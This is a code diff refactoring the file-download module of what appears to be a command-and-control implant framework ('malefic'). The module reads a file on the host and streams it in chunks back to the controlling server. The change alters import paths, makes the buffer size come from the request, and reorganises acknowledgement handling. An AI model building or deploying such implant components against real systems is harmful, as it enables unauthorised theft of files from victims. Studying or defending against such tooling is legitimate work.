@@ -1,9 +1,9 @@
-use crate::{check_field, check_request, Module, Result, TaskError, TaskResult};
+use crate::{check_field, check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
 use malefic_helper::common::filesys::check_sum;
-use malefic_helper::debug;
-use malefic_helper::protobuf::implantpb::DownloadResponse;
-use malefic_helper::protobuf::implantpb::{spite::Body, Block};
+use malefic_helper::{debug, to_error};
+use malefic_proto::proto::modulepb::{DownloadResponse, Block};
+use malefic_proto::proto::implantpb::{spite::Body};
 use malefic_trait::module_impl;
 use std::fs::{metadata, OpenOptions};
 use std::io::Read;
@@ -37,31 +37,28 @@ impl Module for Download {
                 }),
             ))
             .await?;
-        let ack = check_request!(receiver, Body::Ack)?;
-        if !ack.success {
-            return Err((TaskError::FieldInvalid {
-                msg: "download server ack failed".to_string(),
-            })
-            .into());
-        }
 
-        let buffer_size = 1024 * 1024;
+        let buffer_size = request.buffer_size as usize;
         let mut buffer = vec![0; buffer_size];
         let mut seq = 0;
         loop {
+            let ack = check_request!(receiver, Body::Ack)?;
+            if !ack.success {
+                return to_error!(Err("download server ack failed".to_string()));
+            }
             let n = file.read(&mut buffer)?;
-            let mut block = Block {
+            let block = Block {
                 block_id: seq,
                 content: buffer[..n].to_vec(),
                 end: n < buffer_size, // 如果读取的字节少于缓冲区大小，则这是最后一个块
             };
+            debug!("block_id: {}, size {}", block.block_id, n);
             if block.end {
                 return Ok(TaskResult::new_with_body(id, Body::Block(block)));
             } else{
                 let _ = sender.send(TaskResult::new_with_body(id, Body::Block(block))).await?;
                 seq += 1;
             }
-            check_request!(receiver, Body::Ack)?;
         }
     }
 }
